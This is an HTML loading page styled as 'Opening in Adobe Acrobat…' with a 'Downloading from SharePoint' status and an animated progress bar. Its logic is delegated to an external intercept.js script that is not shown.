<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Opening PDF…</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }

    body {
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      background: #0f0f1a;
      font-family: system-ui, -apple-system, 'Segoe UI', sans-serif;
      color: #e0e0e0;
    }

    .container {
      text-align: center;
      padding: 48px;
      background: rgba(26, 26, 46, 0.95);
      border-radius: 16px;
      border: 1px solid rgba(233, 69, 96, 0.2);
      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
      max-width: 420px;
    }

    .icon {
      width: 64px;
      height: 64px;
      margin: 0 auto 24px;
      background: linear-gradient(135deg, #e94560, #c23152);
      border-radius: 16px;
      display: flex;
      align-items: center;
      justify-content: center;
      animation: pulse 1.5s ease-in-out infinite;
    }

    .icon svg {
      width: 36px;
      height: 36px;
      fill: white;
    }

    @keyframes pulse {
      0%, 100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(233, 69, 96, 0.4); }
      50% { transform: scale(1.05); box-shadow: 0 0 20px 4px rgba(233, 69, 96, 0.2); }
    }

    h1 {
      font-size: 18px;
      font-weight: 600;
      margin-bottom: 8px;
      color: #fff;
    }

    .filename {
      font-size: 13px;
      color: #999;
      margin-bottom: 24px;
      word-break: break-all;
      max-height: 40px;
      overflow: hidden;
    }

    .progress-bar {
      width: 100%;
      height: 3px;
      background: rgba(255, 255, 255, 0.08);
      border-radius: 2px;
      overflow: hidden;
    }

    .progress-bar .fill {
      height: 100%;
      width: 30%;
      background: linear-gradient(90deg, #e94560, #ff6b81);
      border-radius: 2px;
      animation: progress 1.5s ease-in-out infinite;
    }

    @keyframes progress {
      0% { transform: translateX(-100%); width: 30%; }
      50% { width: 60%; }
      100% { transform: translateX(400%); width: 30%; }
    }

    .status {
      margin-top: 16px;
      font-size: 12px;
      color: #666;
    }

    .error {
      color: #e94560;
      margin-top: 16px;
      font-size: 13px;
      display: none;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="icon">
      <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
        <path d="M14 2H6C4.9 2 4 2.9 4 4v16c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V8l-6-6zM6 20V4h7v5h5v11H6z"/>
        <path d="M8 15.01h3.02L8 11.99v3.02zM13.41 11H11v2.41l2.41-2.41zM11 15.41V18h2.59L11 15.41z"/>
      </svg>
    </div>
    <h1>Opening in Adobe Acrobat…</h1>
    <p class="filename" id="filename">Preparing download…</p>
    <div class="progress-bar"><div class="fill"></div></div>
    <p class="status" id="status">Downloading from SharePoint</p>
    <p class="error" id="error"></p>
  </div>

  <script src="intercept.js"></script>
</body>
</html>
